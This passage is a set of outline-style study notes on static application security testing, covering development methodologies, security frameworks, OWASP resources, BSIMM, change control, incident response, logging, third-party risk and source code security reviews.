			§ Source code review: Identify vulnerabilities early.

			§ QA process review: Confirm security tests are included.

			§ Deployed application review: Test for exploitable weaknesses post-release.

		○ Static Testing

			§ Focuses on documentation and code review, with some overlap into QA.

			§ Advantages:

				□ Cheaper to fix issues before production.

				□ More effective when built-in early vs. bolted-on later.

				□ Low-risk because it doesn’t disrupt production systems.

			§ Balance in Security Testing

				□ Consider developer workflows, market pressures (e.g., release deadlines, outsourcing), and team skill levels.

				□ Don’t assume skills—assess strengths/weaknesses of both developers and testers.

				□ Design tests that respect these constraints to ensure adoption and effectiveness.

			§ Outcome

				□ A balanced, integrated approach reduces both the likelihood and impact of security vulnerabilities.

				□ Security becomes part of the development culture, not an afterthought.



Development Methodologies

	• Understanding application development methodologies is essential for integrating security testing effectively. Since different organizations and teams use different frameworks, security professionals must adapt their approach to fit the chosen methodology.

	• Key Concepts

		○ Why Methodologies Matter

			§ Methodologies = frameworks that define how teams plan, build, and deploy applications.

			§ They are especially critical for large-scale teams where orchestration is required.

			§ Security integration depends on the methodology in use.

		○ Four Popular Methodologies

			§ Waterfall (Structured \& Sequential)

				□ Origin: Popularized by the U.S. DoD in the 1980s.

				□ Process: Phased approach — Requirements → Design → Implementation → Testing → Integration → Deployment → Maintenance.

				□ Security Fit: Straightforward — embed security requirements in each phase and perform checks between phases.

			§ Agile (Iterative \& Flexible)

				□ Origin: Agile Manifesto (2001) with 4 key values:

					® Individuals \& interactions > processes \& tools

					® Working software > comprehensive documentation

					® Customer collaboration > contract negotiation

					® Responding to change > following a plan

				□ Process: Continuous iteration \& prototyping; no rigid phases.

				□ Security Fit: Harder to test at the end of phases (since they don’t exist). Security must adapt to iteration cycles.

			§ Rapid Application Development (RAD)

				□ Hybrid of Waterfall and Agile.

				□ Front-loads data modeling \& business process modeling to define requirements.

				□ Then adopts iterative prototyping similar to Agile.

				□ Security Fit: More difficult than Waterfall, but feasible through code security reviews rather than heavy documentation.

			§ DevOps (Cross-functional \& Continuous)

				□ Origin: Term coined in 2009, popularized by The Phoenix Project.

				□ Brings development + IT operations together.

				□ Focus: Speed, collaboration, and ongoing changes/maintenance.

				□ Subset: DevSecOps integrates security directly into DevOps processes.

				□ Security Fit: Security must be part of continuous delivery and collaboration.

			§ Other Methodologies

				□ Variants exist (e.g., Scrum, Extreme Programming under Agile).

				□ Important to recognize that different teams use different methods, and some may blend approaches.

			



Programming Languages

	• Security testers must understand the landscape of programming languages because static application security testing (SAST) depends on the language an application is written in. You don’t need to master every language, but you should be familiar with the most common ones and their distinctions.

	• Key Concepts

		○ Variety of Programming Languages

			§ Like methodologies, developers have many programming languages to choose from.

			§ Analogy: Rosetta Stone → multiple languages expressing the same message.

			§ Today, instead of 3, there are hundreds to thousands of languages.

		○ Impact on Security Testing

			§ Different languages require different testing tools for static code analysis.

			§ SAST effectiveness depends on choosing tools that match the application’s language.

		○ Focus on Popular Languages

			§ You don’t need to be an expert in every language.

			§ Apply the 80/20 rule: ~80% of code reviewed will be written in ~20% of the most popular languages.

			§ GitHub Octoverse Report provides data on the most widely used languages.

			§ GitHub is also a useful platform for:

				□ Developer collaboration.

				□ Finding open-source code to practice security testing techniques.

		○ Distinctions Between Languages

			§ Critical to recognize differences between languages (e.g., Java vs. JavaScript).

			§ Confusing them damages credibility with developers and can invalidate tests.

		○ Language Generations

			§ Programming languages evolved by generation:

				□ Early generations → closer to hardware (machine code, assembly).

				□ Later generations → easier to read, easier to write (high-level languages).

			§ Understanding this helps put modern languages in context.

		○ Preparation for Testing

			§ Testers must build familiarity with the programming languages they’ll encounter.

			§ Knowing language characteristics is prerequisite to effective SAST.



Security Frameworks

	Security frameworks provide accumulated best practices for integrating security into application development and testing. Instead of starting from scratch, security testers can leverage established frameworks and compliance standards to guide their static application security testing (SAST).

	• Key Concepts

		○ Purpose of Security Frameworks

			§ Frameworks represent accumulated security knowledge (standing on “shoulders of giants”).

			§ They guide how to align functional goals of developers (make it work) with defensive goals of security professionals (make it safe).

			§ Nearly all major frameworks already include application security requirements.

		○ Four Recommended Security Frameworks

			§ ISO/IEC 27000 series

				□ Collection of information security standards.

				□ Common reference: ISO 27001 (ISMS).

				□ Highly practical: ISO 27002 (2022) — 93 controls, grouped into:

					® Organizational

					® People

					® Physical

					® Technological

			§ NIST Cybersecurity Framework (CSF)

				□ US NIST publications consolidated into a cybersecurity/risk management approach.

				□ 108 controls grouped into 5 functions:

					® Identify

					® Protect

					® Detect

					® Respond

					® Recover

				□ COBIT (Control Objectives for Information and Related Technology)

					® Created by ISACA.

					® Broader IT governance focus.

					® Includes application security controls linked to governance/IT controls.

				□ CIS Critical Security Controls

					® From the Center for Internet Security.

					® Provides prioritized, maturity-based controls, tailored to resources \& expertise.

					® Unlike others, CIS explicitly prioritizes which controls to address first.

		○ Compliance Standards vs. Security Frameworks

			§ Frameworks: Provide guidance/best practices.

			§ Compliance Standards: Impose mandatory rules; failure = penalties.

		○ Examples:

			§ Financial: Sarbanes-Oxley (SOX), Gramm-Leach-Bliley Act (GLBA).

			§ Healthcare: HIPAA (Health Insurance Portability and Accountability Act).

			§ Payments: PCI DSS (Payment Card Industry Data Security Standard).

			§ Privacy: GDPR (EU), CCPA (California), PIPEDA (Canada).

		○ Practical Application

			§ Use frameworks and compliance standards as foundation for building security testing strategies.

			§ Then leverage OWASP for tactical, technical guidance on how to perform tests.



The OWASP Top 10

	• OWASP (Open Web Application Security Project) is a leading nonprofit in application security, and its Top 10 Project is the most recognized resource for identifying and mitigating the most critical web application security risks. The OWASP Top 10 provides not just a list but also actionable threat modeling and remediation guidance.

	• Key Concepts

		○ About OWASP

			§ A nonprofit foundation focused on improving application security globally.

			§ Provides a wide range of open-source projects, tools, and documentation.

			§ Projects are categorized as:

				□ Flagship Projects: Mature, strategic, widely adopted (e.g., OWASP Top 10).

				□ Production Projects: Production-ready, still a growing category.

				□ Other Projects: Tools, documentation, or experimental/playground projects (some may evolve into higher status).

		○ The OWASP Top 10 Project

			§ Flagship project and OWASP’s most well-known contribution.

			§ First published in 2003.

			§ Official version-controlled updates began in 2004, with a commitment to refresh every three years.

			§ A committee of professionals reviews and updates the list based on the evolving threat landscape.

		○ Structure and Content of the Top 10

			§ The Top 10 list itself is concise, but the white paper adds depth:

				□ Explains why each risk matters.

				□ Provides methods for identifying and remediating vulnerabilities.

				□ Offers threat modeling guidance:

					® Threat agents (who may attack).

					® Attack vectors (how they attack).

					® Security controls to mitigate risks.

					® Technical and business impacts if successful.

		○ Importance of the Top 10

			§ Serves as a practical, widely accepted baseline for web application security.

			§ Translates academic or theoretical security issues into real-world attack scenarios.

			§ Freely available — lowering the barrier for developers and security teams to adopt best practices.

			§ Acts as a foundation for security testing, including static application security testing (SAST).



Other Notable Projects

	• While the OWASP Top 10 is the most famous, OWASP offers many other powerful resources and tools that support both static and dynamic application security testing. These projects provide guides, frameworks, and tools that help testers, developers, and organizations mature their security programs.

	• Key Concepts

		○ OWASP Web Security Testing Guide (WSTG)

			§ 200+ page PDF with detailed guidance.

			§ Organizes tests into 11 categories with 100+ individual tests.

			§ Provides instructions on tools and techniques.

			§ Used to build a baseline security profile before penetration testing.

			§ One of the most valuable resources for security testers.

		○ OWASP Code Review Guide

			§ 220 pages of detailed guidance.

			§ Explains why code reviews matter and what to look for.

			§ Includes code examples tied to OWASP Top 10 risks.

			§ Helps developers answer: “How exactly do we perform a code security review?”

		○ OWASP ZAP (Zed Attack Proxy)

			§ Web application proxy + vulnerability scanner.

			§ Allows testers to capture and manipulate traffic between client and server.

			§ Includes an automated vulnerability scanner (not as deep as commercial tools, but still effective).

			§ Any vulnerabilities it finds should be taken seriously.

		○ OWTF (Offensive Web Testing Framework)

			§ Aimed at penetration testers.

			§ Automates many web app security tests.

			§ Combines knowledge from:

				□ OWASP Testing Guide

				□ Penetration Testing Execution Standard (PTES)

				□ NIST guidance

			§ Goal: automate basic tests so testers can focus on complex ones.

		○ OWASP SAMM (Software Assurance Maturity Model)

			§ Provides a maturity model for software assurance.

			§ Based on five business functions:

				□ Governance

				□ Design

				□ Implementation

				□ Verification

				□ Operations

			§ Each function has three security practices, scored by maturity.

			§ Produces a clear picture of application security gaps.

		○ How to Use These Projects

			§ For static testing:

				□ Incorporate Testing Guide, Code Review Guide, and SAMM.

			§ For dynamic testing:

				□ Use Testing Guide again (applies to both static/dynamic).

				□ Use ZAP and OWTF for automation.

		○ OWASP Community Value

			§ OWASP continuously publishes and updates projects.

			§ All resources are free and extremely valuable.

			§ Testers and developers should:

				□ Leverage them in daily work.

				□ Contribute back to projects or share with security groups.

				□ Stay updated on new and evolving projects.



Top 25 Software Errors

	• The SANS Institute and MITRE Corporation collaborated to create the Top 25 Most Dangerous Software Errors, a resource that goes beyond the OWASP Top 10 by providing a deeper and broader look at software vulnerabilities. This list, grounded in MITRE’s CWE (Common Weakness Enumeration), gives security testers and developers more detailed insights into common coding errors, and practical ways to integrate them into Agile development.

	• Key Concepts

		○ Background on SANS Institute

			§ Founded in 1989, major provider of cybersecurity training and research.

			§ Known for multi-day training courses worldwide.

			§ Established GIAC certifications to validate practitioner skills in security.

		○ Background on MITRE

			§ Not-for-profit, federally funded R\&D organization.

			§ Works across defense, intelligence, homeland security, and cybersecurity.

			§ Maintains the CWE (Common Weakness Enumeration):

				□ A standardized “common language” for describing software weaknesses.

				□ Helps unify how vulnerabilities are defined and addressed.

		○ The Top 25 Software Errors

			§ In 2010, SANS + MITRE partnered to publish the Top 25 Most Dangerous Software Errors.

			§ Based on CWE data, but prioritized by severity and prevalence.

			§ More detailed than OWASP Top 10:

				□ Broader scope, deeper insights into software security risks.

			§ Limitation: Unlike OWASP Top 10, it’s not updated with the same consistency/due diligence.

		○ Practical Application in Agile Development

			§ Stephen Dye (AppSec expert \& CISO) authored “Secure Agile Development: 25 Security User Stories.”

			§ Combines the Top 25 errors with Agile methodology.

			§ Each error is mapped into a security user story format, including:

				□ Clear descriptions (developer-friendly language).

				□ Test steps.

				□ Acceptance criteria.

			§ Purpose: Helps developers integrate security testing naturally into Agile workflows.\\

		○ Importance for Security Testing

			§ OWASP Top 10 = baseline risks, widely adopted.

			§ SANS/MITRE Top 25 = deeper, broader coverage of dangerous coding errors.

			§ Using both helps testers and developers:

				□ Gain better coverage of risks.

				□ Communicate in a shared language (via CWE, Agile stories).

				□ Embed security earlier and more effectively.



BSIMM (Building Security in Maturity Model)

	• The BSIMM (Building Security in Maturity Model) provides a structured, maturity-based approach to improving software security. Unlike compliance frameworks, BSIMM helps organizations move beyond “checking the box” to addressing the root causes of vulnerabilities through systematic practices across governance, intelligence, software security touchpoints, and deployment.

	• Key Concepts

		○ Why BSIMM Matters

			§ Created by 100+ organizations across industries (heavily influenced by financial services and software vendors).

			§ Similar to OWASP SAMM, but broader and more industry-backed.

			§ Emphasizes: “Compliance ≠ Security” — real security comes from maturity.

			§ Vulnerabilities = symptoms, not the root problem → BSIMM focuses on addressing root causes.

		○ Structure of BSIMM

			§ 121 activities, grouped by:

				□ Three maturity levels:

					® Level 1 → basic activities.

					® Level 2 → intermediate.

					® Level 3 → mature, advanced.

				□ 12 practices within four domains.

		○ The Four Domains

			§ Governance (organize, manage, measure)

				□ Strategy \& Metrics → roles, responsibilities, budgets, KPIs.

				□ Compliance \& Policy → internal/external standards (e.g., HIPAA, PCI DSS).

				□ Training → build shared knowledge, common security language.

			§ Intelligence (create reusable artifacts)

				□ Attack Models → view from attacker’s perspective to prioritize risks.

				□ Security Features \& Design → reusable secure design patterns.

				□ Standards \& Requirements → technical control documentation building on policies.

			§ SSDL Touchpoints (hands-on security in SDLC)

				□ Architecture Analysis → validate diagrams and system design.

				□ Code Review → multiple roles, tools, and perspectives to catch flaws early.

				□ Security Testing → vulnerability analysis (static → informs dynamic).

			§ Deployment (secure release \& post-production)

				□ Penetration Testing → test if controls withstand attacks.

				□ Software Environment → OS, WAF, monitoring, change management.

				□ Configuration \& Vulnerability Management → patching, updates, defect \& incident management.

			§ Practical Use

				□ Recommended approach: start with one domain at a time to avoid overwhelm.

				□ BSIMM provides a roadmap for organizations to gauge current maturity, identify gaps, and improve systematically.

				□ Ties together governance, design, static/dynamic testing, and operations → full lifecycle coverage.



Building Your Test Lab

	• To perform effective static (and later dynamic) application security testing, you need a lightweight but well-prepared test lab. This involves using virtual machines, static code analysis tools, IDEs, and ultimately a structured checklist to ensure consistency and repeatability in testing.

	• Key Concepts

		○ Test Lab Setup with Virtual Machines

			§ Virtual Machines (VMs) provide an isolated, flexible environment for testing.

			§ Benefits: Easy to spin up, reset, and restore.

			§ Options:

				□ VMware Workstation Player: Popular, requires a license for commercial use.

				□ Oracle VirtualBox: Free, but sometimes requires extra configuration.

		○ Static Testing Focus

			§ While much static testing involves documentation review, hands-on code review is still critical.

			§ Requires tools that can scan and analyze source code for vulnerabilities.

		○ Core Static Code Analysis Tools

			§ Codacy:

				□ Cloud-based or enterprise edition.

				□ Integrates with GitHub/Bitbucket to analyze code on every commit or pull request.

				□ Detects quality and security issues.

			• SonarQube:

				□ Larger user base, similar to Codacy.

				□ Community Edition is free for local use.

				□ SonarCloud available for online code inspection.

			• Both tools provide broad language support and can serve as central pieces of the testing toolkit.

		○ Integrated Development Environments (IDEs)

			• IDEs are the tools developers use to write, test, and debug code.

			• Examples:

				□ Visual Studio (popular for .NET).

				□ Eclipse (common for Java).

			• Many IDEs now support multiple languages.

			• Security plugins exist for IDEs, allowing developers to secure code as they write it, making them an important part of proactive security.

		○ Next Step – Testing Checklist

			• Beyond tools, testers need a checklist.

			• Purpose:

				□ Ensure a consistent, repeatable testing process.

				□ Wrap together frameworks, maturity models (like SAMM \& BSIMM), and static testing tools.

			• This checklist bridges knowledge into practice, providing structure and reliability.



Preparing Your Checklist

	• A testing checklist is essential for creating a repeatable, consistent, and measurable static application security testing (SAST) process. By including pre-engagement activities, clearly defined scope, and alignment with organizational practices, the checklist ensures reliable results that improve security over time.

	• Key Concepts

		○ Purpose of a Checklist

			• A one-time test provides insights, but a checklist ensures repeatability and consistency.

			• Helps testers measure improvement across time.

			• Supports continuous security validation, not just compliance or busywork.

			• Ultimate goals of testing:

				□ Protect confidential data.

				□ Maintain application integrity.

				□ Ensure availability/reliability for users.

		○ Measurement and Metrics

			• Security tests should be results-driven.

			• Measuring outcomes helps determine if testing efforts are effective.

			• Fine-tuning the process is necessary as applications evolve.

			• Metrics will be covered in more depth later in the course.

		○ Pre-Engagement Interactions

			• Checklist should not start with tests — preparation is critical.

			• Pre-engagement activities determine success of testing.

			• Key components:

				□ Scope verification: What’s in scope vs. out of scope.

				□ Testing time frames: Static testing offers more flexibility than dynamic testing.

				□ Tools \& techniques: Document in advance and review with developers.

		○ Five Key Questions to Answer Before Testing

			• What development methodologies do we follow? (e.g., Waterfall, Agile, DevOps)

			• What programming languages do we use? (impacts SAST tools needed)

			• What risk or security frameworks do we follow? (ISO, NIST, CIS, etc.)

			• What third-party libraries do we use? (open-source dependency risks)

			• What stages in the development process require approval from security? (integration points for security reviews)

		○ Principle: “Measure Twice, Cut Once”

			• Jumping into tests without preparation risks missing issues.

			• Pre-engagement = “measuring twice.”

			• Reduces mistakes and increases efficiency of the testing phase.



#### Security Documentation



`Internal Project Plans

	• Integrating static application security testing (SAST) into internal project plans—especially for new deployments and significant changes—is an effective way to reduce remediation costs, improve security outcomes, and ensure security is treated as a core requirement alongside functionality and quality.

	• Key Concepts

		○ When to Use Project Plans for Security

			§ Waterfall: Common practice, naturally fits.

			§ Agile: Still useful, though lighter weight.

			§ DevOps: Different pace, but planning has value.

			§ Best fit scenarios:

				□ Brand new deployments → If it didn’t exist yesterday and will tomorrow, treat it as new.

				□ Significant changes → Indicators:

					® Adding entirely new functionality.

					® Rewriting code in a different programming language.

		○ Cost Savings of Early Security

			§ Forrester (2016): Fixing defects earlier saves 5–15x remediation costs.

			§ US-CERT guidance (historical): Security assurance ties closely with project management discipline.

		○ Embedding Security into the SDLC

			§ Requirement gathering: Document security requirements alongside functional ones.

			§ Design phase: Security should analyze designs as a malicious user would, feeding into dynamic test cases.

			§ Development phase:

				□ Perform source code security reviews (not just code reviews).

				□ Favor automated reviews, triggered on check-ins or even while a developer is away.

			§ Clarity \& Accountability in Security Tasks

				□ For each task, answer:

					® What is the task? → Define clearly, manual vs automated, and expected outcome.

					® Who is responsible? → Ensure individual accountability, not shared.

					® When is it due? → Set deadlines or tie to dependencies.

		○ Role of the Security Tester

			§ If you’re the tester (not PM), take initiative:

				□ Meet with the project/product manager to identify security touchpoints.

				□ Focus on static tests that add maximum value with minimal effort.

				□ Stress that security = quality.

				□ Advocate for automated source code security reviews as the ultimate goal.



Communication Planning

	• Effective communication and integration of security testing into an organization’s change control process is essential. Without structured planning, changes can unintentionally introduce security flaws. By understanding policies, procedures, and stakeholders—and adapting to models like ITIL or CI/CD—security testing can be embedded into every change cycle to reduce risk.

	• Key Concepts

		○ Importance of Change Control

			§ Organizations implement change control policies to reduce the risk of system/application issues from changes.

			§ Without structured control, changes are more likely to cause unexpected impacts.

			§ Security-related flaws (e.g., SQL injection, insecure data exposure) may go unnoticed by users but exploited by attackers.

			§ Security testing must be included in every scheduled change.

		○ Stakeholders in Change Control

			§ End users → directly impacted by changes.

			§ Developers → authors and maintainers of the code being changed.

			§ IT Infrastructure teams → support servers, networks, and databases underpinning applications.

			§ IT Audit teams → verify adherence to change processes.

		○ Policy vs. Procedures

			§ Change Control Policy → high-level rules.

			§ Procedures → detailed steps for:

				□ Proposing changes.

				□ Reviewing changes.

				□ Testing changes (before and after implementation).

			§ Must align with technical standards and security guidelines (e.g., 2FA must never be disabled).

		○ ITIL (Information Technology Infrastructure Library)

			§ Widely used framework for IT change control.

			§ Defines types of changes:

				□ Emergency

				□ Standard

				□ Major

				□ Normal

			§ Introduces CAB (Change Advisory Board) → cross-functional group to review potential impacts of changes.

		○ CI/CD vs. Traditional ITIL

			§ CI/CD pipelines focus on speed and automation:

				□ Automated security scans (e.g., SAST in pipeline).

				□ Code tested, compiled, and deployed without lengthy approvals.

			§ Contrasts with ITIL’s formal, review-heavy processes.

			§ Modern DevOps requires adapting security testing to frequent, rapid releases.

		○ Security Testing Alignment

			§ To integrate effectively:

				□ Understand how your organization promotes changes (ITIL vs. CI/CD).

				□ Choose the right security tools and techniques for that environment.

				□ Embed static and dynamic security testing into every change cycle.



Change Control Policy

	• An effective communication plan is essential when integrating static application security testing into projects. Clear, role-based, and audience-appropriate communication keeps everyone aligned, ensures that flaws are remediated promptly, and helps maintain project flow without unnecessary delays or misunderstandings.

	• Key Concepts

		○ Purpose of a Communication Plan

			§ Keeps everyone on the same page.

			§ Ensures awareness of testing activities, findings, and remediations.

			§ Helps coordinate impacts on schedules, resources, and responsibilities.

			§ Static testing is low-risk for production, but findings can still affect timelines.

		○ Core Questions to Answer

			§ Who is impacted?

				□ Identify roles (PMs, developers, testers, analysts, auditors).

				□ Best practice: use names, emails, and phone numbers.

			§ How are they impacted?

				□ PMs need high-level status (“task done or not”).

				□ Developers need detailed remediation instructions and deadlines.

			§ Workflow Considerations

				□ Clarify in advance:

					® Who performs testing.

					® How much time testing adds (minimize via automation).

					® Who reviews results (ideally a second set of eyes).

					® Who signs off on fixes/remediation.

				□ These roles/tasks should already be documented in the project plan.

		○ Communication Styles \& Channels

			§ Traditional methods: Weekly meetings, task-tracking emails.

			§ Agile methods: Daily standup meetings (short, focused).

			§ Modern tools: Real-time messaging (e.g., Slack) → quick feedback loops.

			§ Best practice: adapt communication to the team’s preference to improve adoption.

		○ Best Practices

			§ Always communicate from the audience’s perspective.

			§ Clearly state:

				□ Expectations.

				□ Required actions.

				□ Acknowledgment/completion signals (so tasks don’t fall through the cracks).

			§ Avoid assumptions (e.g., sending an email without ensuring it was read/understood).



Security Incident Response Policy

	• Security incident response policies define how organizations prepare for and respond to threats. By understanding these policies—and the distinctions between events, incidents, and breaches—application security testers can better design static testing activities, align with organizational priorities, and involve the right stakeholders.

	• Key Concepts

		○ Terminology Matters

			§ Security Event → A logged activity (success/failure, benign or suspicious).

			§ Security Incident → Analyzed event(s) that confirm an active threat requiring action.

			§ Security Breach → A subset of incidents involving data loss or exposure.

				□ Example: DoS = incident, but not necessarily a breach.

		○ CIA Triad (Impact Categories)

			§ Most security incidents affect one of three areas:

				□ Confidentiality → Unauthorized disclosure of data.

				□ Integrity → Unauthorized alteration of data.

				□ Availability → Denial of access or service outages.

			§ Connection to Static Application Security Testing (SAST)

				□ SAST exists to find and fix vulnerabilities before attackers exploit them.

				□ Reviewing your org’s incident response policies informs:

					® Which vulnerabilities matter most.

					® Which stakeholders should be included in planning.

					® How to align test priorities with organizational risk exposure.

		○ Key Documentation

			§ Security Incident Response Policy → Defines scope \& responsibilities.

			§ Security Incident Response Plan → Broader execution framework.

			§ Incident Response Procedures/Playbooks → Step-by-step guides for responders under pressure.

				□ High value: tickets from actual incidents → reveal attack vectors (especially if app-related).

		○ Industry Guidance

			§ NIST SP 800-61 Rev. 2: Comprehensive guide on incident handling.

				□ Covers: building teams, equipping them, handling incidents, and internal/external communication.

				□ Mentions applications 44 times → strong tie to AppSec testing relevance.

			§ Practical Takeaway for Testers

				□ Incorporating incident response context into SAST makes your testing:

					® More useful → addresses real-world threats.

					® More relevant → aligned with organizational priorities.

					® More integrated → brings in stakeholders you might otherwise miss.



Logging and Monitoring Policy

	• Effective logging and monitoring policies are critical for detecting, responding to, and preventing security incidents. Weak or missing log controls can make it impossible to determine what happened during an incident. Application security testing (especially static testing) must include reviewing how applications generate, protect, and store logs to ensure compliance, incident response readiness, and long-term forensic capability.

	• Key Concepts

		○ Importance of Logging \& Monitoring

			§ Without logs, organizations can’t investigate incidents or determine data theft.

			§ Weak/nonexistent logging = potential business-ending risk.

			§ Logging = foundation; Monitoring (SIEM) = analysis and response layer.

		○ Log Management vs. SIEM

			§ Log Management → Collects and stores system \& application logs for long-term access.

			§ Security Information and Event Management (SIEM) → Analyzes logs in near real-time to detect threats, generate alerts, or trigger automated responses.

			§ Together form a layered pyramid: log management as the base, SIEM as the pinnacle.

		○ Four Questions for Static Testing of Logging

			§ Can the app generate logs?

				□ If not, it may not be production-ready.

			§ Are logs compliant with internal/external requirements?

				□ Policy review determines what must be captured.

			§ Are logs sufficient for near-term incident response?

				□ Should support quick analysis in case of an attack.

			§ Are logs sufficient for long-term forensics?

				□ Must provide meaningful data even a year later.

		○ Standards \& Guidance

			§ NIST SP 800-92 → Guide to Computer Security Log Management; covers infrastructure, log file content, and operational processes.

			§ PCI DSS Section 10 → Simple, concise guidance on events to log and required log contents. Great baseline for developers.

			§ Intelligence Community Standard (ICS) 500-27 → Comprehensive government-grade requirements, including auditable events, log elements, and compromise indicators.

		○ Application Security Testing Implications

			§ Static tests should review the code responsible for generating and protecting logs.

			§ Logging \& monitoring requirements should be built into app design.

			§ Logs are crucial for dynamic testing later (validating security behavior in production-like settings).



Third-Party Agreements

	• Cloud services, SaaS, and third-party developers are now standard in business operations. Since internal teams usually cannot directly test third-party applications, organizations must manage third-party security risk through identification, documentation, contractual requirements, and vulnerability assessments—including for open-source libraries.

	• Key Concepts

		○ Third-Party Risk in Security Testing

			§ You may be authorized to test internal applications, but not third-party apps.

			§ You may be authorized to test internal applications, but not third-party apps.

			§ Using third-party apps extends trust outside the traditional perimeter.

			§ Risk: Attackers may target the weaker third-party vendor rather than the stronger internal org.

			§ Example: A mobile app linked a critical function to a developer’s personal domain instead of the organization’s.

		○ Identifying Third-Party Dependencies

			§ Start with:

				• Purchasing dept. → records of SaaS solutions.

				• Legal dept. → contracts and agreements.

				• Security team → firewall logs showing outbound connections.

				• Risk management team → may track vendor assessments.

				• End users → ask: “What websites do you log into for your job?”

			§ Contractual Security Requirements

				• Work with purchasing and legal to put requirements in writing.

				• Common inclusions:

					® Compliance expectations → vendor must show evidence of alignment with frameworks (ISO 27001, NIST CSF, CIS).

					® Internal security standards → can be required but burdensome for vendors with many clients.

					® Liability clauses → more effective than compliance language; makes vendor financially responsible for damages from insecure code.

				• Example: Dropbox blog on better vendor security assessments

		○ Open-Source Libraries

			§ Unlike vendors, open-source projects have no contracts.

			§ Still must identify and assess open-source dependencies in applications.

			§ Tools for vulnerability detection:

				• Sonatype OSS Index → search engine for vulnerable components (Go, RubyGems, Drupal, etc.).

				• OWASP Dependency-Check → supports Java \& .NET, with experimental support for Ruby, Node.js, Python.

				• Bundler Audit (Ruby) → checks for patch-level verification in Bundler-managed projects.

		○ Implications for Static Application Security Testing (SAST)

			§ Security testers should:

				• Map out third-party SaaS and developer dependencies.

				• Ensure contracts include security, compliance, and liability terms.

				• Scan and verify open-source libraries for known vulnerabilities.

			§ Key principle: Trust but verify—don’t rely on vendor assurances alone.



OWASP ASVS

	• The OWASP Application Security Verification Standard (ASVS) provides a structured framework to measure, test, and communicate application security requirements. It helps organizations align with maturity goals, set expectations with vendors, and verify whether apps meet appropriate levels of security assurance through static and dynamic testing.

	• Key Concepts

		○ Purpose of OWASP ASVS

			§ Aids communication between developers, testers, and vendors.

			§ Provides metrics to track application security maturity.

			§ Offers procurement support → organizations can set security requirements for third-party developers.

			§ Functions as a capability maturity model for application security.

		○ ASVS Security Levels

			§ Level 1 (Low assurance):

				□ Focus on basic security controls.

				□ Suitable for apps that don’t handle sensitive data.

				□ Good starting point for teams new to application security.

			§ Level 2 (Standard assurance):

				□ Applies to most applications, especially those handling sensitive or regulated data.

				□ Recommended for apps under HIPAA, PCI DSS, or similar compliance frameworks.

			§ Level 3 (High assurance):

				□ For business-critical applications (24/7 availability, core to the business).

				□ Most effort-intensive to achieve, but provides the highest assurance.

		○ Structure of ASVS

			§ 14 Control Objectives (categories of security controls), e.g.:

				□ Authentication

				□ Session management

				□ Error handling

				□ Stored cryptography

			§ Requirements under each objective:

				□ Define specific security behaviors or features (e.g., algorithms, secrets management).

				□ Tagged with security levels (1–3) based on assurance strength.

		○ CWE Mapping

			§ Each requirement maps to CWE (Common Weakness Enumeration).

			§ Ensures consistency with MITRE/SANS Top 25 software errors.

			§ Helps testers focus on real, common weaknesses.

		○ Application in Testing

			§ ASVS requirements can be verified with:

				□ Static tests (SAST).

				□ Dynamic tests (DAST).

				□ Or a combination depending on organizational approach.

			§ Provides guardrails → helps teams design and prioritize testing activities effectively.



#### Source Code Security Reviews



Challenges of Assessing Source Code

	• Source code reviews for functionality and source code security reviews serve different purposes. While functional reviews confirm that the application works as intended, security reviews assess resilience against attacks, requiring both automated and manual approaches. Implementing code security reviews effectively involves process standardization, tooling, training, and overcoming cultural and resource challenges.

	• Key Concepts

		○ Difference Between Code Review and Code Security Review

			§ Code Review: Ensures functionality (e.g., ZIP Code field lookup works correctly).

			§ Code Security Review: Ensures resilience (e.g., test unexpected input, SQL injection, buffer overflows).

			§ Functional tests may pass while critical vulnerabilities remain undiscovered.

		○ Attacker’s Perspective

			§ Security testing must assume unexpected or malicious input.

			§ Even trivial functions (like ZIP Code lookups) can reveal insecure coding patterns that attackers might exploit elsewhere (e.g., sensitive data tables).

		○ Automated vs. Manual Reviews

			§ Automated Reviews:

				□ Fast, scalable, necessary to meet deadlines.

				□ Cover large codebases quickly.

			§ Manual Reviews:

				□ Provide training and education for developers.

				□ Help developers learn to write secure code the first time.

				□ Identify logic flaws automation might miss.

			§ Best practice: Use both in tandem.

		○ Organizational and Process Challenges

			§ Well-defined processes: Testing cannot be haphazard—prototype, document, iterate.

			§ Resources: Need people with security expertise (in both the security and development teams).

			§ Tools: Free/open-source options exist, but commercial tools may be necessary (cost + training curve).

			§ Timeline pushback: Security testing must be integrated into project planning, not tacked on last-minute.

			§ Training: Developers, testers, and stakeholders need awareness of the process and its value.

		○ Cultural Shift

			§ Developers and testers must understand why secure coding and security reviews matter.

			§ Consistent application of security reviews builds long-term improvements in secure development practices.



OWASP Code Review Guide

	• The OWASP Code Review Guide is a foundational resource for performing source code security reviews, helping organizations integrate secure coding practices into the SDLC. It provides methodology, threat modeling frameworks, practical examples, and aligns with the OWASP Top 10 to improve both static and dynamic application security testing.

	• Key Concepts

		○ Purpose and Scope

			§ Step-by-step framework for performing source code security reviews.

			§ Explains what a code security review is, how to scope it, and how to couple it with penetration testing.

			§ Integrates reviews into the Software Development Life Cycle (SDLC).

		○ Alignment and Practical Guidance

			§ Aligned with the OWASP Top 10 risks.

			§ Provides specific code snippets showing how vulnerabilities may appear in source code.

			§ Shows what to review and how to validate defenses.

			§ Includes internal and external references (e.g., MITRE, Usenix, php.net, Microsoft).

		○ Integration with Other OWASP Resources

			§ Complements the OWASP Testing Guide:

				□ Code Review Guide = Static Application Security Testing (SAST).

				□ Testing Guide = Dynamic Application Security Testing (DAST).

			§ Using both together strengthens application security testing.

		○ Risk and Threat Modeling

			§ Promotes a risk-based approach to prioritize testing.

			§ Emphasizes maturity and business drivers to align security testing with organizational priorities.

			§ Uses threat modeling techniques:

				□ STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege).

				□ DREAD (Damage, Reproducibility, Exploitability, Affected Users, Discoverability).

			§ Helps apply likelihood × impact scoring to prioritize vulnerabilities.

		○ Audience

			§ The guide is designed for three key groups:

				□ Management – Understands why reviews matter, even if not hands-on.

				□ Software leads – Bridges the gap between code reviews and code security reviews.

				□ Code security reviewers – Hands-on practitioners performing the detailed analysis.

		○ Process Considerations

			§ Factors to plan reviews:

				□ Number of lines of code.

				□ Programming languages used.

				□ Available resources and time constraints.

			§ Larger, more complex applications require deeper reviews.

			§ If time/resources are lacking → supplement with additional dynamic testing.

		○ Value Proposition

			§ Prevents teams from being overwhelmed by scope.

			§ Provides a practical, structured methodology that empowers testers and developers.

			§ Encourages adoption across the organization by balancing technical, managerial, and developer perspectives.



Static Code Analysis

